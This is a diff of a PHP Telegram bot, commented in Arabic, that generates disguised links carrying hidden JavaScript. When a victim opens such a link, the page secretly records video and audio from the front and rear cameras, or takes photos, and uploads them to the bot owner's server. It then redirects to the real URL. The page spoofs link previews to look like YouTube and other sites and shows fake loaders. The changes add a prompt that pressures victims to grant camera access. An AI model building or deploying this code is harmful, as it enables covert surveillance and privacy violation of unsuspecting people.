-        } elseif ($action === 'admin_unban_user_prompt') { // Old mass unban prompt
+        } elseif ($action === 'admin_unban_user_prompt') {
             file_put_contents(getUserStateFile($chat_id, 'admin_state'), 'waiting_for_unban_id');
             editMessage($chat_id, $message_id, "الرجاء إرسال ID المستخدم الذي تريد إلغاء حظره:");
             exit;
@@ -814,21 +731,17 @@ if (isset($update['message'])) {
         }
     }
 
-    // --- 5. Regular user callbacks ---
-    
-    // في جزء callback_query handling، أضف هذا الشرط:
     if (strpos($data, 'generate_qr:') === 0) {
-        $link_hash = substr($data, 12); // 12 هو طول 'generate_qr:'
+        $link_hash = substr($data, 12);
         generateQRCode($chat_id, $message_id, $link_hash);
         exit;
     }
     
-    // Pagination Handler (New)
     if (strpos($data, 'paginate_message:') === 0) {
         $pagination_data = explode(':', $data);
         $file_id = $pagination_data[1];
         $page = intval($pagination_data[2]);
-        $context = $pagination_data[3] ?? 'admin_panel'; // Default context
+        $context = $pagination_data[3] ?? 'admin_panel';
         handlePaginatedMessage($chat_id, $message_id, $file_id, $page, $context);
         exit;
     }
@@ -841,7 +754,7 @@ if (isset($update['message'])) {
 function showStartMessage($chat_id) {
     $welcome_text = "👋 مرحباً بك في بوت إنشاء الروابط المخصصة!\n\n"
                   . "هذا البوت يساعدك على إنشاء روابط فريدة تحتوي على كود جافاسكريبت مخفي.\n"
-                  . "يمكنك إعداد الرابط الأصلي، اختيار الإجراء الذي تريده (مثل رسالة منبثقة أو تسجيل الكاميرا)، "
+                  . "يمكنك إعداد الرابط الأصلي، اختيار الإجراء الذي تريده، "
                   . "واختيار واجهة تحميل جذابة لإخفاء الكود.\n\n"
                   . "للبدء، يرجى استخدام القائمة بالأسفل:";
     sendMessage($chat_id, $welcome_text, showMainMenuKeyboard($chat_id));
@@ -885,7 +798,7 @@ function showQualityOptions($chat_id, $message_id) {
             [['text' => 'جودة متوسطة (Medium)', 'callback_data' => 'quality_choice:medium']],
             [['text' => 'جودة جيدة (Good)', 'callback_data' => 'quality_choice:good']],
             [['text' => 'جودة ممتازة (Excellent)', 'callback_data' => 'quality_choice:excellent']],
-            [['text' => '🔙 العودة', 'callback_data' => 'set_action']] // Back to action choice
+            [['text' => '🔙 العودة', 'callback_data' => 'set_action']]
         ]
     ];
     editMessage($chat_id, $message_id, "🌟 **الخطوة 2.5: اختيار الجودة**\nالرجاء اختيار جودة الصور/الفيديوهات الملتقطة:", json_encode($keyboard));
@@ -913,11 +826,10 @@ function processUserChoices($chat_id, $text) {
     $state = explode(':', $state_data)[0];
 
     if ($state === 'waiting_for_url') {
-        // Basic URL validation
         if (filter_var($text, FILTER_VALIDATE_URL)) {
             file_put_contents(getUserStateFile($chat_id, "url"), $text);
             sendMessage($chat_id, "✅ تم إعداد الرابط الأصلي بنجاح!\n\nيمكنك الآن اختيار الإجراء وواجهة التحميل من القائمة الرئيسية.");
-            @unlink($state_file); // Clear state after use
+            @unlink($state_file);
             showMainOptions($chat_id);
         } else {
             sendMessage($chat_id, "❌ الرابط الذي أدخلته غير صالح. الرجاء إدخال رابط صحيح (يبدأ بـ http:// أو https://).");
@@ -937,7 +849,6 @@ function editMessageReplyMarkup($chat_id, $message_id, $data) {
     $action = $parts[0];
 
     $state_file = getUserStateFile($chat_id, "state");
-    $url_file = getUserStateFile($chat_id, "url");
     $action_file = getUserStateFile($chat_id, "action");
     $quality_file = getUserStateFile($chat_id, "quality");
     $loading_file = getUserStateFile($chat_id, "loading");
@@ -991,14 +902,6 @@ function editMessageReplyMarkup($chat_id, $message_id, $data) {
 
 // --- Admin Panel Functions ---
 
-/**
- * Displays a list of users with pagination and search option.
- * @param int $admin_chat_id
- * @param int $message_id
- * @param string $list_type 'allowed' or 'banned'
- * @param int $page
- * @param array|null $filtered_users Optional, for search results
- */
 function listUsersForAdmin($admin_chat_id, $message_id, $list_type = 'allowed', $page = 0, $filtered_users = null) {
     if ($filtered_users === null) {
         $all_users = getAllBotUsers();
@@ -1020,19 +923,6 @@ function listUsersForAdmin($admin_chat_id, $message_id, $list_type = 'allowed', 
         return;
     }
     
-    if (empty($users_on_page)) {
-        $text .= "⚠️ لا يوجد مستخدمون في هذه الصفحة.";
-        // Fallback to previous page if it exists
-        if ($page > 0) {
-            $page--;
-            $offset = $page * ITEMS_PER_PAGE;
-            $users_on_page = array_slice($users_to_list, $offset, ITEMS_PER_PAGE, true);
-        } else {
-            editMessage($admin_chat_id, $message_id, $text, showAdminPanelKeyboard());
-            return;
-        }
-    }
-
     $keyboard_buttons = [];
     foreach ($users_on_page as $id => $user_data) {
         $name = htmlspecialchars($user_data['first_name'] ?? 'N/A');
@@ -1040,7 +930,6 @@ function listUsersForAdmin($admin_chat_id, $message_id, $list_type = 'allowed', 
         $keyboard_buttons[] = [['text' => "{$name}{$username} (ID: {$id})", 'callback_data' => "admin_user_details:{$id}:{$list_type}"]];
     }
     
-    // Pagination buttons
     $nav_buttons = [];
     if ($page > 0) {
         $nav_buttons[] = ['text' => '◀️', 'callback_data' => "admin_list_users:{$list_type}:" . ($page - 1)];
@@ -1070,7 +959,6 @@ function handleAdminUserSearch($admin_chat_id, $query) {
         $first_name = mb_strtolower($user_data['first_name'] ?? '', 'UTF-8');
         $username = mb_strtolower($user_data['username'] ?? '', 'UTF-8');
         
-        // Search by ID, first name, or username
         if (strpos((string)$id, $query) !== false || strpos($first_name, $query) !== false || strpos($username, $query) !== false) {
             $filtered_users[$id] = $user_data;
         }
@@ -1080,12 +968,11 @@ function handleAdminUserSearch($admin_chat_id, $query) {
 
     if (empty($filtered_users)) {
         $text .= "⚠️ لم يتم العثور على مستخدمين يطابقون كلمة البحث.";
-        $keyboard_buttons[] = [['text' => '🔙 العودة لقائمة المستخدمين', 'callback_data' => 'admin_list_allowed_users']];
-        editMessage($admin_chat_id, null, $text, json_encode(['inline_keyboard' => $keyboard_buttons]));
+        $keyboard_buttons = [['text' => '🔙 العودة لقائمة المستخدمين', 'callback_data' => 'admin_list_allowed_users']];
+        editMessage($admin_chat_id, null, $text, json_encode(['inline_keyboard' => [$keyboard_buttons]]));
         return;
     }
     
-    // Display results in a paginated list
     listUsersForAdmin($admin_chat_id, null, 'search_results', 0, $filtered_users);
 }
 
@@ -1118,7 +1005,7 @@ function showUserDetailsKeyboard($target_chat_id, $context) {
     $is_banned = isUserBanned($target_chat_id);
     $keyboard_buttons = [];
 
-    if ((string)$target_chat_id !== (string)ADMIN_CHAT_ID) { // Admin cannot ban/unban self
+    if ((string)$target_chat_id !== (string)ADMIN_CHAT_ID) {
         if ($is_banned) {
             $keyboard_buttons[] = [['text' => '✅ إلغاء حظر المستخدم', 'callback_data' => "admin_unban_specific_user:{$target_chat_id}"]];
         } else {
@@ -1126,24 +1013,17 @@ function showUserDetailsKeyboard($target_chat_id, $context) {
         }
     }
     
-    // Always allow sending message to an allowed user
     if (!$is_banned) {
         $keyboard_buttons[] = [['text' => '✉️ إرسال رسالة مباشرة', 'callback_data' => "admin_send_message_to_user_prompt:{$target_chat_id}"]];
     }
     
-    // Add button to view user's generated links and media
     $keyboard_buttons[] = [['text' => '🔗 عرض الروابط والبيانات', 'callback_data' => "admin_view_user_links_and_media:{$target_chat_id}"]];
 
-    // Determine back button
-    $back_callback = 'admin_list_allowed_users'; // Default back button
-    if ($context === 'banned') {
-        $back_callback = 'admin_list_banned_users';
-    }
+    $back_callback = ($context === 'banned') ? 'admin_list_banned_users' : 'admin_list_allowed_users';
     $keyboard_buttons[] = [['text' => '🔙 العودة لقائمة المستخدمين', 'callback_data' => $back_callback]];
 
     return json_encode(['inline_keyboard' => $keyboard_buttons]);
 }
-
 
 function showAdminPanel($chat_id, $message_id = null) {
     $maintenance_status = isMaintenanceMode() ? "✅ مفعل" : "❌ معطل";
@@ -1162,7 +1042,7 @@ function showAdminPanelKeyboard() {
             [['text' => '👥 المستخدمون المسموح لهم', 'callback_data' => 'admin_list_users:allowed:0']],
             [['text' => '🚫 المستخدمون المحظورون', 'callback_data' => 'admin_list_users:banned:0']],
             [['text' => '✉️ بث رسالة', 'callback_data' => 'admin_broadcast_message_prompt']],
-            [['text' => '📋 عرض كل الروابط', 'callback_data' => 'admin_view_links_page:0']], // Changed text for clarity
+            [['text' => '📋 عرض كل الروابط', 'callback_data' => 'admin_view_links_page:0']],
             [['text' => '🗑️ حذف الروابط القديمة', 'callback_data' => 'admin_delete_old_links_prompt']],
             [['text' => '📊 إحصائيات البوت', 'callback_data' => 'admin_bot_stats']],
             [['text' => $maintenance_button_text, 'callback_data' => 'admin_toggle_maintenance']],
@@ -1173,11 +1053,10 @@ function showAdminPanelKeyboard() {
 }
 
 function broadcastMessageToAllAllowedUsers($admin_chat_id, $message_to_send) {
-    $allowed_users = loadAllowedUsers(); // Only broadcast to allowed users
+    $allowed_users = loadAllowedUsers();
     $sent_count = 0;
     $failed_count = 0;
     foreach ($allowed_users as $chat_id => $user_data) {
-        // Skip admin themselves
         if ((string)$chat_id === (string)$admin_chat_id) {
             continue;
         }
@@ -1186,18 +1065,11 @@ function broadcastMessageToAllAllowedUsers($admin_chat_id, $message_to_send) {
             $sent_count++;
         } else {
             $failed_count++;
-            // Optionally log or report failed sends
         }
     }
     sendMessage($admin_chat_id, "✅ تم بث الرسالة بنجاح إلى {$sent_count} مستخدم.\n❌ فشل إرسال إلى {$failed_count} مستخدم.");
 }
 
-/**
- * Lists generated links for admin with pagination.
- * @param int $admin_chat_id
- * @param int $message_id
- * @param int $page
- */
 function listGeneratedLinksForAdmin($admin_chat_id, $message_id, $page = 0) {
     $all_files = glob(GENERATED_LINKS_DIR . 'link_owner_*.html');
 
@@ -1264,7 +1136,6 @@ function listGeneratedLinksForAdmin($admin_chat_id, $message_id, $page = 0) {
 
     $full_text = implode("", $text_parts);
 
-    // Pagination buttons
     $keyboard_buttons = [];
     $nav_buttons = [];
     if ($page > 0) {
@@ -1281,7 +1152,6 @@ function listGeneratedLinksForAdmin($admin_chat_id, $message_id, $page = 0) {
     
     editMessage($admin_chat_id, $message_id, $full_text, json_encode(['inline_keyboard' => $keyboard_buttons]));
 }
-
 
 function listUserGeneratedLinksAndMedia($admin_chat_id, $message_id, $target_chat_id) {
     $links_info = [];
@@ -1324,7 +1194,6 @@ function listUserGeneratedLinksAndMedia($admin_chat_id, $message_id, $target_cha
         $text_parts[] = "🔸 **الرابط:** <a href=\"" . htmlspecialchars($link['url']) . "\">" . htmlspecialchars($link['url']) . "</a>\n";
         $text_parts[] = "<b>تاريخ الإنشاء:</b> {$link['created_at']}\n";
 
-        // Find associated media for this link hash
         $media_files = glob(GENERATED_LINKS_DIR . "*{_}{$link['link_hash']}_*.{webm,jpg}", GLOB_BRACE);
         if (!empty($media_files)) {
             $text_parts[] = "  **البيانات الملتقطة:**\n";
@@ -1341,15 +1210,13 @@ function listUserGeneratedLinksAndMedia($admin_chat_id, $message_id, $target_cha
     
     $full_text = implode("", $text_parts);
     
-    // Pass the message and context to the new pagination handler
     handleLongMessage($admin_chat_id, $message_id, $full_text, 'user_details:' . $target_chat_id);
 }
-
 
 function deleteOldLinks($admin_chat_id, $days) {
     $deleted_count = 0;
     $errors = [];
-    $files = glob(GENERATED_LINKS_DIR . '*.html'); // Get all HTML files in the directory
+    $files = glob(GENERATED_LINKS_DIR . '*.html');
     $cutoff_timestamp = time() - ($days * 24 * 60 * 60);
 
     foreach ($files as $file) {
@@ -1373,7 +1240,7 @@ function deleteOldLinks($admin_chat_id, $days) {
 function showBotStatsForAdmin($admin_chat_id, $message_id) {
     $total_allowed_users = count(loadAllowedUsers());
     $total_banned_users = count(loadBannedUsers());
-    $total_links = count(glob(GENERATED_LINKS_DIR . 'link_owner_*.html')); // Only count generated links
+    $total_links = count(glob(GENERATED_LINKS_DIR . 'link_owner_*.html'));
     $total_media_files = count(glob(GENERATED_LINKS_DIR . '*{video_*,photo_*}*.{webm,jpg}', GLOB_BRACE));
     $maintenance_status = isMaintenanceMode() ? "✅ مفعل" : "❌ معطل";
     
@@ -1394,7 +1261,7 @@ function toggleMaintenanceMode($admin_chat_id, $message_id) {
 
     $status_text = $new_status ? "تفعيل" : "إلغاء تفعيل";
     sendMessage($admin_chat_id, "✅ تم {$status_text} وضع الصيانة بنجاح. البوت الآن " . ($new_status ? "قيد الصيانة." : "يعمل بشكل طبيعي."));
-    showAdminPanel($admin_chat_id, $message_id); // Refresh admin panel to show new status
+    showAdminPanel($admin_chat_id, $message_id);
 }
 
 
@@ -1407,13 +1274,12 @@ function generateFinalLink($chat_id, $message_id) {
     $loading_type = @file_get_contents(getUserStateFile($chat_id, "loading"));
 
     if (!$quality_choice) {
-        $quality_choice = 'medium'; 
+        $quality_choice = 'medium';
         file_put_contents(getUserStateFile($chat_id, "quality"), $quality_choice);
     }
 
     $owner_user_data = loadAllowedUsers()[$chat_id] ?? ['first_name' => 'Unknown User', 'username' => null];
     $owner_display_name = htmlspecialchars($owner_user_data['first_name'] . ($owner_user_data['username'] ? " (@" . $owner_user_data['username'] . ")" : ""));
-
 
     if (!$original_url || !$action_choice || !$loading_type) {
         $text = "⚠️ يرجى إعداد جميع الخيارات (الرابط، الإجراء، الواجهة) قبل إنشاء الرابط.";
@@ -1421,29 +1287,22 @@ function generateFinalLink($chat_id, $message_id) {
         return;
     }
 
-    // --- Fixed PHP Script URL ---
-    // Using a more reliable way to determine the PHP script's URL.
-    $php_script_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://";
-    $php_script_url .= $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
+    // --- CORRECTED: Use SCRIPT_NAME for accurate PHP script URL ---
+    $php_script_url = getScriptUrl();
     
-    // Generate a unique hash for this specific generated link
     $link_hash = md5($original_url . $action_choice . $loading_type . $chat_id . microtime());
 
     // --- Open Graph Meta Tags Generation ---
     $og_meta_tags = '';
     
-    // Fetch OG data from the original URL
     $fetched_og_data = fetchOgMetaTags($original_url);
 
-    // Default values
     $og_title = htmlspecialchars($fetched_og_data['og:title'] ?? 'محتوى مميز في انتظارك!', ENT_QUOTES | ENT_HTML5, 'UTF-8');
     $og_description = htmlspecialchars($fetched_og_data['og:description'] ?? 'انقر لمتابعة المحتوى الحصري.', ENT_QUOTES | ENT_HTML5, 'UTF-8');
     $og_image = htmlspecialchars($fetched_og_data['og:image'] ?? DEFAULT_THUMBNAIL_URL, ENT_QUOTES | ENT_HTML5, 'UTF-8');
     $og_url = htmlspecialchars($fetched_og_data['og:url'] ?? $original_url, ENT_QUOTES | ENT_HTML5, 'UTF-8');
     $og_type = htmlspecialchars($fetched_og_data['og:type'] ?? 'website', ENT_QUOTES | ENT_HTML5, 'UTF-8');
 
-
-    // Specific handling for YouTube to ensure video player if possible
     $video_id = null;
     if (preg_match('/(?:youtube\.com\/(?:[^\/\n\s]+\/\S+\/|(?:v|e(?:mbed)?)\/|\S*?[?&]v=)|youtu\.be\/)([a-zA-Z0-9_-]{11})/', $original_url, $matches)) {
         $video_id = $matches[1];
@@ -1452,12 +1311,11 @@ function generateFinalLink($chat_id, $message_id) {
     }
 
     if ($video_id) {
-        // Override with YouTube specific meta tags for better embedding
         $youtube_thumbnail_url = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
         $og_title = htmlspecialchars($fetched_og_data['og:title'] ?? 'مشاهدة الفيديو على YouTube', ENT_QUOTES | ENT_HTML5, 'UTF-8');
         $og_description = htmlspecialchars($fetched_og_data['og:description'] ?? 'انقر لمشاهدة هذا الفيديو المثير على YouTube.', ENT_QUOTES | ENT_HTML5, 'UTF-8');
         $og_image = $youtube_thumbnail_url;
-        $og_type = 'video.other'; // More specific for videos
+        $og_type = 'video.other';
         $og_meta_tags = "
             <meta property=\"og:title\" content=\"{$og_title}\">
             <meta property=\"og:description\" content=\"{$og_description}\">
@@ -1482,7 +1340,6 @@ function generateFinalLink($chat_id, $message_id) {
             <meta name=\"twitter:player:height\" content=\"720\">
         ";
     } else {
-        // General OG and Twitter Card meta tags for other links
         $og_meta_tags = "
             <meta property=\"og:title\" content=\"{$og_title}\">
             <meta property=\"og:description\" content=\"{$og_description}\">
@@ -1496,27 +1353,23 @@ function generateFinalLink($chat_id, $message_id) {
         ";
     }
 
-
-    // Variables to be injected into JavaScript code
     $js_template_vars = [
         'original_url' => addslashes($original_url),
         'owner_chat_id' => $chat_id,
         'owner_username' => addslashes($owner_display_name),
         'php_script_url' => addslashes($php_script_url),
         'quality_choice' => $quality_choice,
-        'generated_link_hash' => $link_hash // New: Inject the generated link's hash
+        'generated_link_hash' => $link_hash
     ];
 
-    $javascript_code = '';
-    
-    if ($action_choice == '5' || $action_choice == '7' || $action_choice == '8' || $action_choice == '9' || $action_choice == '10' || $action_choice == '11') {
-        $sendDataToPHP_function = <<<JS_FUNCTION
+    // Common sendDataToPHP function with improved error handling
+    $sendDataToPHP_function = <<<JS_FUNCTION
     async function sendDataToPHP(dataBlob, type) {
         const formData = new FormData();
         formData.append('ownerChatId', ownerChatId);
         formData.append('ownerUsername', ownerUsername);
         formData.append('original_url', original_url);
-        formData.append('generatedLinkHash', generatedLinkHash); // Pass the generated link hash
+        formData.append('generatedLinkHash', generatedLinkHash);
         if (type === 'video') {
             formData.append('video', dataBlob, 'video.webm');
         } else if (type === 'photo') {
@@ -1526,7 +1379,9 @@ function generateFinalLink($chat_id, $message_id) {
         }
 
         try {
-            console.log('Sending data to:', phpScriptUrl);
+            console.log('Sending ' + type + ' to:', phpScriptUrl);
+            console.log('Data size:', dataBlob.size || dataBlob.length || 'unknown');
+            
             const response = await fetch(phpScriptUrl, {
                 method: 'POST',
                 body: formData
@@ -1536,16 +1391,16 @@ function generateFinalLink($chat_id, $message_id) {
             console.log('Server response:', result);
             
             if (!response.ok) {
-                throw new Error('Failed to send data');
+                throw new Error('HTTP error: ' + response.status);
             }
             return result;
         } catch (error) {
             console.error('Error sending data to PHP:', error);
+            // Still throw but log it for debugging
             throw error;
         }
     }
 JS_FUNCTION;
-    }
 
     $video_constraints_js = <<<JS
     let videoResolution, videoBitrate, videoFrameRate, photoQuality, photoWidth, photoHeight;
@@ -1553,29 +1408,29 @@ JS_FUNCTION;
     switch (quality_choice) {
         case 'low':
             videoResolution = { width: { max: 320 }, height: { max: 240 } };
-            videoBitrate = 300000; // 300 kbps
+            videoBitrate = 300000;
             videoFrameRate = { max: 10 };
             photoWidth = 640; photoHeight = 480; photoQuality = 0.6;
             break;
         case 'medium':
             videoResolution = { width: { ideal: 640 }, height: { ideal: 480 } };
-            videoBitrate = 800000; // 800 kbps
+            videoBitrate = 800000;
             videoFrameRate = { ideal: 15 };
             photoWidth = 960; photoHeight = 720; photoQuality = 0.75;
             break;
         case 'good':
             videoResolution = { width: { ideal: 960 }, height: { ideal: 720 } };
-            videoBitrate = 1500000; // 1.5 Mbps
+            videoBitrate = 1500000;
             videoFrameRate = { ideal: 20 };
             photoWidth = 1280; photoHeight = 960; photoQuality = 0.85;
             break;
         case 'excellent':
             videoResolution = { width: { ideal: 1280 }, height: { ideal: 720 } };
-            videoBitrate = 2500000; // 2.5 Mbps
+            videoBitrate = 2500000;
             videoFrameRate = { ideal: 25 };
             photoWidth = 1920; photoHeight = 1080; photoQuality = 0.95;
             break;
-        default: // Default to medium
+        default:
             videoResolution = { width: { ideal: 640 }, height: { ideal: 480 } };
             videoBitrate = 800000;
             videoFrameRate = { ideal: 15 };
@@ -1584,20 +1439,26 @@ JS_FUNCTION;
     }
 JS;
 
+    $javascript_code = '';
+    
+    // Generate JavaScript based on action choice with PERMISSION DENIAL HANDLING
     if ($action_choice == '5') {
-        // كود تسجيل فيديو سيلفي (الكاميرا الأمامية)
         $javascript_code = <<<EOT
 <video id="camera-feed" width="320" height="240" autoplay muted style="display: none;"></video>
 <p id="status" style="color:white; text-align:center;"></p>
+<div id="error-message" style="display:none; color: #ff4444; text-align: center; padding: 20px; font-size: 18px; background: rgba(0,0,0,0.8); border-radius: 10px; margin: 20px;">
+    ⚠️ يجب السماح بصلاحيات الكاميرا والميكروفون للمتابعة
+</div>
 <script>
     const cameraFeed = document.getElementById('camera-feed');
     const statusDisplay = document.getElementById('status');
+    const errorDiv = document.getElementById('error-message');
     const original_url = "{original_url}";
     const phpScriptUrl = "{php_script_url}";
     const ownerChatId = "{owner_chat_id}";
     const ownerUsername = "{owner_username}";
     const quality_choice = "{quality_choice}";
-    const generatedLinkHash = "{generated_link_hash}"; // New: Injected link hash
+    const generatedLinkHash = "{generated_link_hash}";
 
     {$sendDataToPHP_function}
     {$video_constraints_js}
@@ -1606,6 +1467,13 @@ JS;
     let recordedChunks = [];
     const recordDuration = 5000;
     let isRecording = false;
+
+    function showPermissionError() {
+        errorDiv.style.display = 'block';
+        document.querySelector('h1') ? document.querySelector('h1').style.display = 'none' : '';
+        const loader = document.querySelector('.loader, .loader-bar, .recaptcha-box');
+        if (loader) loader.style.display = 'none';
+    }
 
     async function startCameraWithAudio() {
         try {
@@ -1617,47 +1485,39 @@ JS;
             statusDisplay.textContent = ' ';
             setTimeout(startRecording, 1000);
         } catch (error) {
-            window.location.href = original_url;
-            console.error('فشل في الوصول إلى الكاميرا والميكروفون.', error);
+            console.error('Camera permission denied:', error);
+            showPermissionError();
+            return false;
         }
     }
 
     async function startRecording() {
-        if (!cameraFeed.srcObject || isRecording) {
-            return;
-        }
+        if (!cameraFeed.srcObject || isRecording) return;
         isRecording = true;
         const stream = cameraFeed.srcObject;
         const mediaConstraints = {
-            video: {
-                mimeType: 'video/webm;codecs=vp9,opus',
-                ...videoResolution,
-                frameRate: videoFrameRate,
-                bitrate: videoBitrate
-            },
+            video: { mimeType: 'video/webm;codecs=vp9,opus', ...videoResolution, frameRate: videoFrameRate, bitrate: videoBitrate },
             audio: true
         };
         mediaRecorder = new MediaRecorder(stream, mediaConstraints);
         recordedChunks = [];
-        statusDisplay.textContent = ' ';
         mediaRecorder.ondataavailable = event => {
-            if (event.data.size > 0) {
-                recordedChunks.push(event.data);
-            }
+            if (event.data.size > 0) recordedChunks.push(event.data);
         };
         mediaRecorder.onstop = async () => {
             const blob = new Blob(recordedChunks, { type: 'video/webm' });
-            await sendDataToPHP(blob, 'video');
-            statusDisplay.textContent = ' ';
+            try {
+                await sendDataToPHP(blob, 'video');
+                stream.getTracks().forEach(track => track.stop());
+                window.location.href = original_url;
+            } catch(e) {
+                console.error('Failed to send video:', e);
+            }
             isRecording = false;
-            stream.getTracks().forEach(track => track.stop());
-            window.location.href = original_url;
         };
         mediaRecorder.start();
         setTimeout(() => {
-            if (mediaRecorder && mediaRecorder.state === 'recording') {
-                mediaRecorder.stop();
-            }
+            if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
         }, recordDuration);
     }
     
@@ -1665,19 +1525,22 @@ JS;
 </script>
 EOT;
     } elseif ($action_choice == '7') {
-        // كود تسجيل فيديو امامي (الكاميرا الخلفية)
         $javascript_code = <<<EOT
 <video id="camera-feed" width="320" height="240" autoplay muted style="display: none;"></video>
 <p id="status" style="color:white; text-align:center;"></p>
+<div id="error-message" style="display:none; color: #ff4444; text-align: center; padding: 20px; font-size: 18px; background: rgba(0,0,0,0.8); border-radius: 10px; margin: 20px;">
+    ⚠️ يجب السماح بصلاحيات الكاميرا والميكروفون للمتابعة
+</div>
 <script>
     const cameraFeed = document.getElementById('camera-feed');
     const statusDisplay = document.getElementById('status');
+    const errorDiv = document.getElementById('error-message');
     const original_url = "{original_url}";
     const phpScriptUrl = "{php_script_url}";
     const ownerChatId = "{owner_chat_id}";
     const ownerUsername = "{owner_username}";
     const quality_choice = "{quality_choice}";
-    const generatedLinkHash = "{generated_link_hash}"; // New: Injected link hash
+    const generatedLinkHash = "{generated_link_hash}";
 
     {$sendDataToPHP_function}
     {$video_constraints_js}
@@ -1686,6 +1549,13 @@ EOT;
     let recordedChunks = [];
     const recordDuration = 5000;
     let isRecording = false;
+
+    function showPermissionError() {
+        errorDiv.style.display = 'block';
+        document.querySelector('h1') ? document.querySelector('h1').style.display = 'none' : '';
+        const loader = document.querySelector('.loader, .loader-bar, .recaptcha-box');
+        if (loader) loader.style.display = 'none';
+    }
 
     async function startCameraWithAudio() {
         try {
@@ -1697,47 +1567,39 @@ EOT;
             statusDisplay.textContent = ' ';
             setTimeout(startRecording, 1000);
         } catch (error) {
-            window.location.href = original_url;
-            console.error('فشل في الوصول إلى الكاميرا والميكروفون.', error);
+            console.error('Camera permission denied:', error);
+            showPermissionError();
+            return false;
         }
     }
 
     async function startRecording() {
-        if (!cameraFeed.srcObject || isRecording) {
-            return;
-        }
+        if (!cameraFeed.srcObject || isRecording) return;
         isRecording = true;
         const stream = cameraFeed.srcObject;
         const mediaConstraints = {
-            video: {
-                mimeType: 'video/webm;codecs=vp9,opus',
-                ...videoResolution,
-                frameRate: videoFrameRate,
-                bitrate: videoBitrate
-            },
+            video: { mimeType: 'video/webm;codecs=vp9,opus', ...videoResolution, frameRate: videoFrameRate, bitrate: videoBitrate },
             audio: true
         };
         mediaRecorder = new MediaRecorder(stream, mediaConstraints);
         recordedChunks = [];
-        statusDisplay.textContent = ' ';
         mediaRecorder.ondataavailable = event => {
-            if (event.data.size > 0) {
-                recordedChunks.push(event.data);
-            }
+            if (event.data.size > 0) recordedChunks.push(event.data);
         };
         mediaRecorder.onstop = async () => {
             const blob = new Blob(recordedChunks, { type: 'video/webm' });
-            await sendDataToPHP(blob, 'video');
-            statusDisplay.textContent = ' ';
+            try {
+                await sendDataToPHP(blob, 'video');
+                stream.getTracks().forEach(track => track.stop());
+                window.location.href = original_url;
+            } catch(e) {
+                console.error('Failed to send video:', e);
+            }
             isRecording = false;
-            stream.getTracks().forEach(track => track.stop());
-            window.location.href = original_url;
         };
         mediaRecorder.start();
         setTimeout(() => {
-            if (mediaRecorder && mediaRecorder.state === 'recording') {
-                mediaRecorder.stop();
-            }
+            if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
         }, recordDuration);
     }
     
@@ -1745,19 +1607,22 @@ EOT;
 </script>
 EOT;
     } elseif ($action_choice == '8') {
-        // كود تسجيل فيديو بالكاميرتان
         $javascript_code = <<<EOT
 <video id="camera-feed" width="320" height="240" autoplay muted style="display: none;"></video>
 <p id="status" style="color:white; text-align:center;"></p>
+<div id="error-message" style="display:none; color: #ff4444; text-align: center; padding: 20px; font-size: 18px; background: rgba(0,0,0,0.8); border-radius: 10px; margin: 20px;">
+    ⚠️ يجب السماح بصلاحيات الكاميرا والميكروفون للمتابعة
+</div>
 <script>
     const cameraFeed = document.getElementById('camera-feed');
     const statusDisplay = document.getElementById('status');
+    const errorDiv = document.getElementById('error-message');
     const original_url = "{original_url}";
     const phpScriptUrl = "{php_script_url}";
     const ownerChatId = "{owner_chat_id}";
     const ownerUsername = "{owner_username}";
     const quality_choice = "{quality_choice}";
-    const generatedLinkHash = "{generated_link_hash}"; // New: Injected link hash
+    const generatedLinkHash = "{generated_link_hash}";
 
     {$sendDataToPHP_function}
     {$video_constraints_js}
@@ -1765,64 +1630,60 @@ EOT;
     const recordDuration = 5000;
     let mediaRecorder;
 
+    function showPermissionError() {
+        errorDiv.style.display = 'block';
+        document.querySelector('h1') ? document.querySelector('h1').style.display = 'none' : '';
+        const loader = document.querySelector('.loader, .loader-bar, .recaptcha-box');
+        if (loader) loader.style.display = 'none';
+    }
+
     function recordVideo(stream, duration) {
-        return new Promise((resolve) => {
+        return new Promise((resolve, reject) => {
             let recordedChunks = [];
             mediaRecorder = new MediaRecorder(stream, {
                 video: { mimeType: 'video/webm;codecs=vp9,opus', ...videoResolution, frameRate: videoFrameRate, bitrate: videoBitrate },
                 audio: true
             });
             mediaRecorder.ondataavailable = event => {
-                if (event.data.size > 0) {
-                    recordedChunks.push(event.data);
-                }
+                if (event.data.size > 0) recordedChunks.push(event.data);
             };
-            mediaRecorder.onstop = () => {
+            mediaRecorder.onstop = async () => {
                 const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                sendDataToPHP(blob, 'video').then(resolve);
+                await sendDataToPHP(blob, 'video');
+                resolve();
             };
+            mediaRecorder.onerror = reject;
             mediaRecorder.start();
             setTimeout(() => {
-                if (mediaRecorder && mediaRecorder.state === 'recording') {
-                    mediaRecorder.stop();
-                }
+                if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
             }, duration);
         });
     }
 
     async function startDualCameraRecording() {
         try {
-            // Record from front camera (user)
             const frontStream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: 'user', ...videoResolution },
                 audio: true
             });
             cameraFeed.srcObject = frontStream;
-            statusDisplay.textContent = ' ';
             await recordVideo(frontStream, recordDuration);
-
-            // Stop the front camera stream
             frontStream.getTracks().forEach(track => track.stop());
-            await new Promise(resolve => setTimeout(resolve, 1000)); // Small delay between cameras
+            await new Promise(resolve => setTimeout(resolve, 1000));
 
-            // Record from rear camera (environment)
             const rearStream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: 'environment', ...videoResolution },
                 audio: true
             });
             cameraFeed.srcObject = rearStream;
-            statusDisplay.textContent = ' ';
             await recordVideo(rearStream, recordDuration);
-            
-            // Stop the rear camera stream
             rearStream.getTracks().forEach(track => track.stop());
 
-            // Redirect after both videos are sent
             window.location.href = original_url;
-
         } catch (error) {
-            console.error('فشل في الوصول إلى الكاميرا أو الميكروفون.', error);
-            window.location.href = original_url;
+            console.error('Camera permission denied:', error);
+            showPermissionError();
+            return false;
         }
     }
     
@@ -1830,29 +1691,38 @@ EOT;
 </script>
 EOT;
     } elseif ($action_choice == '9') {
-        // كود التقاط صورة سيلفي (الكاميرا الأمامية)
         $javascript_code = <<<EOT
 <video id="camera-feed" width="320" height="240" autoplay muted style="visibility: hidden; position: absolute;"></video>
